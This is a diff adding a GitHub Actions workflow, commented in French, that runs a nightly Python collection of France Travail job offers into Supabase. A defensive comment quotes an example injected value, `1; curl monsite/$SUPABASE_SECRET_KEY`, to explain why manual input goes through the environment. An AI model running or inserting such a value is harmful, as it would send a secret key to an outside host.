@@ -1,0 +1,92 @@
+# Collecte nocturne des offres France Travail.
+#
+# Pourquoi GitHub Actions plutôt qu'un cron chez Vercel : voir « Stack » dans le
+# CLAUDE.md. En résumé — 6 h de durée par exécution contre 300 s, gratuit et
+# illimité sur un dépôt public, et ce fichier est versionné donc lisible par qui
+# ouvre le dépôt. Ce n'est PAS parce que Vercel ne saurait pas exécuter Python.
+#
+# ⚠️ LES JOURNAUX DE CE WORKFLOW SONT PUBLICS, le dépôt l'étant. Le pipeline ne
+# journalise que des comptes et des critères de recherche ; `_erreur_assainie()`
+# dans `pipeline/stockage.py` retire les champs `details` et `hint` des erreurs
+# PostgREST, qui portent la ligne refusée — donc potentiellement `contact_nom`,
+# une donnée personnelle. Toute nouvelle trace ajoutée au pipeline doit tenir
+# cette règle.
+
+name: Collecte nocturne
+
+on:
+  schedule:
+    # 02:23 UTC. GitHub planifie en UTC et ignore l'heure d'été : cela donne
+    # 4 h 23 à Paris en été, 3 h 23 en hiver — dans les deux cas, terminé bien
+    # avant la consultation du matin.
+    # ⚠️ Minute volontairement non ronde : GitHub retarde les crons planifiés à
+    # l'heure pile, où toutes les files du monde se déclenchent ensemble.
+    - cron: '23 2 * * *'
+
+  # Déclenchement manuel, depuis l'onglet Actions du dépôt.
+  workflow_dispatch:
+    inputs:
+      depuis_jours:
+        description: "Rattrapage : nombre de jours à collecter. Vide = fenêtre automatique depuis la dernière réussite."
+        required: false
+        default: ''
+
+# Moindre privilège : ce job lit le code et écrit en base. Il n'a aucune raison
+# de pousser un commit, d'ouvrir une issue ou de publier un paquet.
+permissions:
+  contents: read
+
+# ⚠️ Deux collectes simultanées se marcheraient dessus : chacune referme au
+# démarrage les exécutions restées `en_cours`, et borne sa fenêtre sur la
+# dernière réussite en base.
+# `cancel-in-progress: false` est délibéré — annuler une collecte en vol
+# laisserait une ligne `en_cours` orpheline jusqu'au rattrapage du lendemain.
+# On préfère faire la queue.
+concurrency:
+  group: collecte-nocturne
+  cancel-in-progress: false
+
+jobs:
+  collecter:
+    name: Collecter les offres d'Île-de-France
+    runs-on: ubuntu-latest
+
+    # Une collecte de nuit dure quelques minutes, un rattrapage de 30 jours
+    # plusieurs. Au-delà de 30 minutes, le job est pendu — pas lent.
+    # ⚠️ Reste très en deçà d'AGE_EXECUTION_ORPHELINE_HEURES (6 h) dans
+    # `pipeline/config.py` : une exécution tuée ici sera donc bien reconnue
+    # comme orpheline par la collecte suivante, jamais avant.
+    timeout-minutes: 30
+
+    steps:
+      - name: Récupérer le code
+        uses: actions/checkout@v7
+
+      - name: Installer Python
+        uses: actions/setup-python@v7
+        with:
+          python-version: '3.13'
+          cache: pip
+
+      - name: Installer les dépendances
+        run: pip install --disable-pip-version-check -r requirements.txt
+
+      - name: Collecter
+        env:
+          FT_CLIENT_ID: ${{ secrets.FT_CLIENT_ID }}
+          FT_CLIENT_SECRET: ${{ secrets.FT_CLIENT_SECRET }}
+          SUPABASE_URL: ${{ secrets.SUPABASE_URL }}
+          SUPABASE_SECRET_KEY: ${{ secrets.SUPABASE_SECRET_KEY }}
+          # ⚠️ L'entrée manuelle passe par l'ENVIRONNEMENT, jamais par une
+          # interpolation ${{ }} posée directement dans la commande : interpolée,
+          # une valeur comme `1; curl monsite/$SUPABASE_SECRET_KEY` serait
+          # recopiée telle quelle dans le script et exécutée comme une commande.
+          # Ici, le shell la traite comme une donnée, pas comme du code.
+          DEPUIS_JOURS: ${{ inputs.depuis_jours }}
+        run: |
+          if [ -n "$DEPUIS_JOURS" ]; then
+            echo "Rattrapage manuel demandé sur $DEPUIS_JOURS jour(s)."
+            python -m pipeline.collecte --depuis-jours "$DEPUIS_JOURS"
+          else
+            python -m pipeline.collecte
+          fi
